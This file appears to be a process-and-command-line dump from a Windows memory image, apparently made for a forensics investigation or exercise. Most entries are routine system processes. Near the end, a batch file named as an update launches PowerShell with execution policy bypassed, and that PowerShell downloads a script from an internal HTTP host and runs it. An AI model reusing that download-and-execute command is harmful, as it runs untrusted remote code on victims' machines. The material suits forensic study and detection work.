@@ -1,0 +1,813 @@
+
+[
+  {
+    "Args": null,
+    "PID": 4,
+    "Process": "System",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 92,
+    "Process": "Registry",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 324,
+    "Process": "smss.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 440,
+    "Process": "csrss.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 516,
+    "Process": "wininit.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 524,
+    "Process": "csrss.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 616,
+    "Process": "winlogon.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\services.exe",
+    "PID": 660,
+    "Process": "services.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\lsass.exe",
+    "PID": 680,
+    "Process": "lsass.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
+    "PID": 792,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 816,
+    "Process": "fontdrvhost.ex",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 824,
+    "Process": "fontdrvhost.ex",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k RPCSS -p",
+    "PID": 904,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
+    "PID": 996,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"dwm.exe\"",
+    "PID": 368,
+    "Process": "dwm.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p",
+    "PID": 444,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+    "PID": 512,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k LocalService -p",
+    "PID": 1124,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1172,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\System32\\svchost.exe -k NetworkService -p",
+    "PID": 1296,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1448,
+    "Process": "MemCompression",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1668,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1780,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k appmodel -p",
+    "PID": 1812,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted -p",
+    "PID": 1828,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1848,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k LocalServiceNoNetworkFirewall -p",
+    "PID": 1932,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1928,
+    "Process": "spoolsv.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2248,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2428,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\System32\\svchost.exe -k utcsvc -p",
+    "PID": 2456,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2564,
+    "Process": "MpDefenderCore",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2688,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26060.3008-0\\MsMpEng.exe\"",
+    "PID": 2728,
+    "Process": "MsMpEng.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
+    "PID": 3028,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\SearchIndexer.exe /Embedding",
+    "PID": 3420,
+    "Process": "SearchIndexer.",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 3564,
+    "Process": "dllhost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2884,
+    "Process": "WUDFHost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2152,
+    "Process": "AggregatorHost",
+    "__children": []
+  },
+  {
+    "Args": "sihost.exe",
+    "PID": 3928,
+    "Process": "sihost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup",
+    "PID": 4036,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4140,
+    "Process": "taskhostw.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"ctfmon.exe\"",
+    "PID": 4304,
+    "Process": "ctfmon.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4476,
+    "Process": "userinit.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\Explorer.EXE",
+    "PID": 4512,
+    "Process": "explorer.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k ClipboardSvcGroup -p",
+    "PID": 4956,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4212,
+    "Process": "StartMenuExper",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4164,
+    "Process": "RuntimeBroker.",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5916,
+    "Process": "SearchApp.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6068,
+    "Process": "RuntimeBroker.",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\System32\\mousocoreworker.exe -Embedding",
+    "PID": 6404,
+    "Process": "MoUsoCoreWorke",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6548,
+    "Process": "NisSrv.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5272,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding",
+    "PID": 5208,
+    "Process": "RuntimeBroker.",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6332,
+    "Process": "SecurityHealth",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1032,
+    "Process": "SecurityHealth",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Users\\user3\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background",
+    "PID": 2244,
+    "Process": "OneDrive.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1240,
+    "Process": "msedge.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k LocalServiceAndNoImpersonation -p",
+    "PID": 7504,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 7868,
+    "Process": "ShellExperienc",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 7960,
+    "Process": "RuntimeBroker.",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1188,
+    "Process": "FileCoAuth.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4420,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 3228,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4056,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2580,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5900,
+    "Process": "SystemSettings",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 3440,
+    "Process": "ApplicationFra",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6416,
+    "Process": "UserOOBEBroker",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 3580,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 7916,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5824,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4596,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 7892,
+    "Process": "SearchApp.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6628,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 3672,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 7844,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 3292,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6832,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 800,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4652,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 8524,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2188,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 8100,
+    "Process": "taskhostw.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 748,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6064,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4992,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4160,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 8700,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4032,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5404,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2124,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5524,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5432,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5480,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2620,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Program Files\\WindowsApps\\Microsoft.MicrosoftOfficeHub_19.2607.37051.0_x64__8wekyb3d8bbwe\\M365Copilot.exe\" autorestart reason=update",
+    "PID": 6960,
+    "Process": "M365Copilot.ex",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6080,
+    "Process": "RuntimeBroker.",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 3876,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6472,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2840,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1212,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 8340,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 2872,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 3348,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4676,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 7920,
+    "Process": "olk.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\150.0.4078.65\\msedgewebview2.exe\" --embedded-browser-webview=1 --webview-exe-name=olk.exe --webview-exe-version=1.2026.630.300 --user-data-dir=\"C:\\Users\\user3\\AppData\\Local\\Microsoft\\Olk\\EBWebView\" --noerrdialogs --embedded-browser-webview-dpi-awareness=2 --disable-features=msEnhancedTrackingPreventionEnabled --enable-aggressive-domstorage-flushing --enable-features=msSingleSignOnOSForPrimaryAccountIsShared,msAbydos,msAbydosHandwritingAttr,msAbydosGestureSupport,msEnhancedTextContrast,DocumentPolicyNetworkEfficiencyGuardrails --mojo-named-platform-channel-pipe=7920.7940.925405862087524722",
+    "PID": 5816,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 6920,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 8704,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 8672,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1776,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 9112,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 8676,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 7480,
+    "Process": "dllhost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 4524,
+    "Process": "RuntimeBroker.",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5624,
+    "Process": "olkexthost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5244,
+    "Process": "msedgewebview2",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\svchost.exe -k wsappx -p",
+    "PID": 8492,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\wbem\\wmiprvse.exe",
+    "PID": 9920,
+    "Process": "WmiPrvSE.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 11088,
+    "Process": "OneDrive.Sync.",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 9212,
+    "Process": "HxTsr.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 1708,
+    "Process": "smartscreen.ex",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Program Files\\AccessData\\FTK Imager\\FTK Imager.exe\" ",
+    "PID": 9164,
+    "Process": "FTK Imager.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Windows\\SystemApps\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\TextInputHost.exe\" -ServerName:InputApp.AppXk0k6mrh4r2q0ct33a9wgbez0x7v9cz5y.mca",
+    "PID": 10172,
+    "Process": "TextInputHost.",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\System32\\svchost.exe -k NetworkService -p",
+    "PID": 9080,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 7304,
+    "Process": "svchost.exe",
+    "__children": []
+  },
+  {
+    "Args": "C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\user3\\Downloads\\update (1).bat\" \"",
+    "PID": 10304,
+    "Process": "cmd.exe",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 11196,
+    "Process": "conhost.exe",
+    "__children": []
+  },
+  {
+    "Args": "powershell  -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://192.168.1.73:8080/SteamInstaller.ps1' -OutFile 'C:\\Users\\user3\\AppData\\Local\\Temp\\update.ps1'; powershell -ExecutionPolicy Bypass -File 'C:\\Users\\user3\\AppData\\Local\\Temp\\update.ps1'\"",
+    "PID": 9928,
+    "Process": "powershell.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy Bypass -File C:\\Users\\user3\\AppData\\Local\\Temp\\update.ps1",
+    "PID": 6924,
+    "Process": "powershell.exe",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe8_ Global\\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\" \"C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\" \"DownLevelDaemon\" ",
+    "PID": 5616,
+    "Process": "SearchProtocol",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 828 832 840 8192 836 816 ",
+    "PID": 8428,
+    "Process": "SearchFilterHo",
+    "__children": []
+  },
+  {
+    "Args": "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe_S-1-5-21-3632725252-2203086546-1606239288-10019_ Global\\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-3632725252-2203086546-1606239288-10019 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\" \"C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\" \"DownLevelDaemon\"  \"1\"",
+    "PID": 10216,
+    "Process": "SearchProtocol",
+    "__children": []
+  },
+  {
+    "Args": null,
+    "PID": 5408,
+    "Process": "strings64.exe",
+    "__children": []
+  }
+]
